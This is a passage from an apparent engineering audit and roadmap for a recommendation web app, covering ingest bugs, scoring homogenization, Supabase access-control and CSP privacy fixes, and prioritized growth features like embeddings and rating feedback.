  backoff; put **both** workflows in one shared concurrency group (`group: catalog-writes`,
  `cancel-in-progress: false`) so they queue.
- **Verify:** dispatch both jobs together → they queue and both land; no non-fast-forward failures.

### T22 — Ingest/refresh data-quality bugs (dedup, backfill leak, tri-lang union)
- **[reproduced] P2 · ENG ·** `refresh.mjs:149-181,196-198,234-239,107-119,209`
- **Symptoms & changes:**
  1. **Dedup collapses remakes:** dedup is by `normT(title)` only (`:234-239`, `:196-198`), so
     "Dune" (1984) vs (2021) collapse to whichever was seen first. → Dedup on
     `normT(title)+year` (or TMDB/OpenLibrary id).
  2. **Backfill budget leak:** an item filled in only one language fails the `esReal&&ptReal`
     skip (`:155`) but isn't caught by the `tlTried` skip (`:156`), so it's re-searched (2 TMDB
     calls) **every run forever**; conversely a single normT mismatch (`:162`) sets `tlTried`
     permanently and the item is **never retried**. → Store a per-language `tlTried` + a retry
     timestamp; re-attempt misses after N weeks, not never.
  3. **Tri-lang union:** `fetchTmdbSet` populates metadata only on the `en` pass and
     `filter(e=>e.en)` (`:119`) drops any id absent from English trending — losing ES/PT-only
     titles. `refreshBooks` sets `tl:{en,es,pt}` all equal to the English title (`:209`). →
     Union ids across all three passes, derive metadata from whichever language returned it
     (`en→es→pt`); localize book titles (OpenLibrary editions / Wikidata) or add them to backfill.
- **Verify:** run `refresh.mjs` against a fixture → remakes coexist; a half-localized item isn't
  re-searched every run; an ES-only trending film survives.

### T23 — Genre-centroid DNA + unbounded append homogenizes the catalog
- **[measured] P1 · ENG/PRODUCT ·** `refresh.mjs:73-83,133-135`; no prune anywhere
- **Symptom:** `deriveDna` = fixed per-genre centroid + jitter of only **±6**; `deriveTh`/craft
  are also pure functions of genre. Same-genre refreshed items get near-identical dna/th/g/craft
  (per-axis diff ≤12 → `dnaSim` ≈ 0.89, theme/genre overlap = 1.0). ~68 % of the live signal is
  genre-derived, and refresh adds ~480 movie + ~480 tv + 120 book candidates **weekly with no
  prune/quality gate** — steadily inflating "Soul twin" scores and diluting matches.
- **Change:** add real entropy to derived DNA (hash title+year+cast+popularity into per-axis
  offsets, amplitude ~15–20) **or** gate refresh adds behind a min-distance/novelty check
  against existing same-genre items; add a pruning pass (drop low-pop, unlocalized, or
  near-duplicate-DNA items) so the catalog is curated, not merely append-only.
- **Verify:** after a refresh, sample same-genre pairs in the harness → per-axis DNA variance
  clearly increased; catalog size growth is bounded by the novelty gate.
- **Depends on T7** (recalibration) — do T7 first so you're measuring against a sane scale.

### T24 — Supabase RLS + privacy hardening
- **[measured] P2/P3 · ENG ·** `searches` RLS, `app.js:479-480`, `ingest.mjs:25`; `index.html` (CSP)
- **Symptoms & changes:**
  1. **Anon can read every user's searches:** `searches` has anon `SELECT USING(true)` (only so
     ingest can read it with the public key). → Set `searches` SELECT to `USING(false)`; have
     the ingest workflow read with a **`service_role` key stored as a GitHub Actions secret**
     (like `TMDB_KEY`). Anon becomes write-only.
  2. **Unbounded anon INSERT (storage/cost DoS + the T2 vector):** front writes with a Supabase
     **edge function** (schema-enforce + size-cap + per-IP rate-limit + Turnstile) or at minimum
     add column-length `CHECK`s and stop storing the raw `item` blob. Route search-logging and
     any future in-app suggestions through it.
  3. **No CSP:** GitHub Pages can't set headers but supports
     `<meta http-equiv="Content-Security-Policy">`. First externalize the two inline `<script>`
     blocks in `index.html` (`:69` `VIBRA_DATA=null`, `:71` SW registration) into files (or add
     their hashes), then add:
     ```html
     <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';
       object-src 'none'; base-uri 'none'; img-src 'self' https: data:;
       connect-src 'self' https://esviqajfbkdnpoohjpjt.supabase.co https://en.wikipedia.org https://query.wikidata.org;
       style-src 'self' 'unsafe-inline'">
     ```
  4. **No privacy notice:** a persistent pseudo-ID (`muse-sid`) + rating/search payloads are
     stored indefinitely with no policy/consent/retention on a public domain with real users. →
     Publish a short privacy policy (what: sid, ratings, searched titles; purpose; retention;
     erasure contact), add a lightweight notice, set a retention/purge window on both tables.
- **Verify:** `curl` the `searches` SELECT endpoint with the anon key → denied; the ingest job
  still reads via the service_role secret; DevTools shows the CSP active and the app still works.

### T25 — `[skip ci]` cleanup (optional, NOT a fix)
- **[measured] P3 · ENG ·** `refresh.yml:40`, `ingest.yml:29`
- **Note:** Pages **does** deploy the bot commits (verified). `[skip ci]` is a no-op here. Either
  drop it or replace it with a comment. If loop-prevention is ever needed, guard on
  `github.actor != 'muse-bot'`, not commit-message tags. Low priority.

---

## BATCH 4 — Growth bets (each a separate product decision; sequence matters)

Ship in this order — each compounds through the previous.

### B1 — Shareable/deep-linkable results + share sheet — **effort S** — *(this is T6; do it in Batch 1)*
The cheapest growth mechanism; every other bet's "wow" travels through a URL. See T6.

### B2 — Ship `embeddings.b64.json` via Actions — turn on the dormant semantic engine — **effort M**
- **Why now:** the client is 100 % ready and waiting for one file — `loadEmb()` fetches it at
  boot and re-renders, `sw.js:16` already precaches it non-fatally, `emb` carries .22 in every
  `CATALGOS` row and .55 in `crossScore`, and `mmrRerank` prefers it. All 6258 items have an EN
  description to embed. This is the single biggest lever on whether recommendations feel uncanny.
- **Spec:** new `scripts/embed.mjs` (Node 20, runs in Actions, no API key): per item
  `text = t + ' by ' + by + ' — ' + g.join(', ') + ' — ' + th.join(', ') + ' — ' + d.en`; embed
  with `@xenova/transformers` `all-MiniLM-L6-v2` on CPU; L2-normalize; quantize to Int8
  (`round(v*127)`); concat → base64; write `{dim:384, ids:[…], data:'…'}` exactly matching the
  loader (`app.js:288-293`). ~3.2 MB b64 (PCA→256 dims ≈ 2.1 MB if it stings). New `embed.yml`
  (weekly, after refresh; also `workflow_dispatch`) commits the file + runs `bump-sw.mjs`. Also
  re-embed daily-ingested live items. **Do this second** — B5/B6 inherit its quality, and it
  needs zero UI work.

### B3 — "Your shelf": recents + loved list on home — **effort S**
- **Why now:** `renderEmpty()` shows identical marketing copy on visit 1 and visit 50; the only
  surviving state is lang+sid+ratings. This is the honest fix for "~6 ratings total" — rating
  currently gives the user nothing back.
- **Spec:** in `select()` push `{id,ts}` to `localStorage 'muse-recent'` (dedupe, cap 30). In
  `renderEmpty` add a "Recent" row (`suggCards()` already exists at `:464` — restore its CSS)
  and a "Loved" shelf from `loadRatings().filter(r=>r.r===1)`. Add a heart toggle on the source
  card writing `muse-loved`. ~80 lines, all localStorage, fully offline. Pairs with B1 (recent
  tiles become shareable URLs).

### B4 — Make thumbs-down DO something (close the visible loop) — **effort S**
- **Why now:** rating today only toggles a color and silently POSTs — `T.rateThx` CSS ships but
  is never rendered, and ranking ignores `muse-ratings`, so a downvoted match reappears in the
  same slot. Closing this converts a dead gesture into the signature interaction and cleans the
  training data.
- **Spec:** after `recordRating`, insert `T.rateThx` in the `.rate` row (remove after 2 s). In
  `renderResults`, before `mmrRerank`, drop `ratingOf(src.id,x.it.id)===-1` items from `elig`
  (the 30-item pool guarantees a replacement) and re-render on downvote so the next-best slides
  in. ~20 lines. **Ship with B3** (both make rating rewarding, filling B6's dataset).

### B5 — Daily Muse + "new since your last visit" — **effort S**
- **Why now:** the catalog genuinely grows daily (ingest) but the novelty is invisible.
  Push-less re-engagement, no backend.
- **Spec:** deterministic seed = hash of `Date().toISOString().slice(0,10)` → index into
  `ALL.filter(pop>=70)` → a "Today's Muse" card on home (same for every user, cacheable
  offline). Store `ALL.length` in `localStorage`; when it grows, show a "+N new works" pill that
  deep-links (needs B1). Optionally bias the dice toward items added in the last 7 days.

### B6 — Close the learning loop: weekly ratings→CATALGOS refit — **effort M**
- **Why now:** the training rows are already logged in the right shape (`recordRating` posts
  `{parts, pct, r, cat}` — per-algorithm sub-scores + label). But with ~6 ratings a refit is
  noise, so **ship the pipe with a volume gate** and let B3/B4 fill it.
- **Spec:** new `scripts/refit.mjs` + weekly workflow (same commit-push pattern). Read `ratings`
  via Supabase REST (one RLS change: anon SELECT on ratings, or use the service_role key from
  T24); per category fit a logistic regression of `r∈{+1,-1}` on the 9 sub-scores (plain-JS
  gradient descent, no deps); **gate: skip a category unless ≥150 ratings AND held-out AUC beats
  current**; clamp weights to `[0.02,0.35]` and renormalize. Emit `weights.json {cat:[[id,w],…]}`;
  the app fetches it (same non-fatal pattern as `loadEmb`) and overrides `CATALGOS` — `score()`
  already tolerates arbitrary weight vectors (~10-line client change). Sequence **after** B2 so
  weights are fit with `emb` live. **Killed:** per-user taste profiles — data-starved vaporware
  at current volume; global refit is the right first rung.

### B-blend — "A + B →" two-anchor taste blend — **effort M** — *(deliberately last)*
Its wow depends on embeddings (B2) and its virality on deep links (B1); with only tag/mood
overlap, A+B returns generic middle-ground. When both land: a `+ add another love` chip reuses
the existing autocomplete for anchor B; candidate score = harmonic mean of `score(A,c).total`
and `score(B,c).total` (harmonic punishes matching only one anchor); hash `#idA+idB`. ~150 lines.
This is also the natural onboarding moment ("pick two things you love") — no separate wizard.

---

## Appendix — one REFUTED claim (don't act on it)
"`[skip ci]` suppresses the GitHub Pages deploy of bot commits." **REFUTED [measured]:** the
`pages-build-deployment` workflow runs on GitHub's internal `dynamic` event (not `push`) and
succeeded for both cited bot commits. The automation loop *does* ship. Treat `[skip ci]` as
harmless clutter (T25), not a bug.

## Appendix — recommended "next three" (balanced)
1. **Reliability:** **T2** — stop folding attacker JSON into the served catalog (+esc the four
   sinks). It's a live stored-XSS + catalog-vandalism path against real users; small, safe.
2. **Experience:** **T7 + T3** — recalibrate the engine so the % and tiers mean something, and
   stop showing "Semantic match 0%". The product's entire pitch is *explainable, ranked* matches;
   today the numbers are decorative. Highest trust-per-line in the codebase.
3. **Growth:** **B1** — shareable URLs + working back button. The magic moment is a ranked list;
   right now it can't leave the phone and the back button exits the app. ~40 lines, no build.
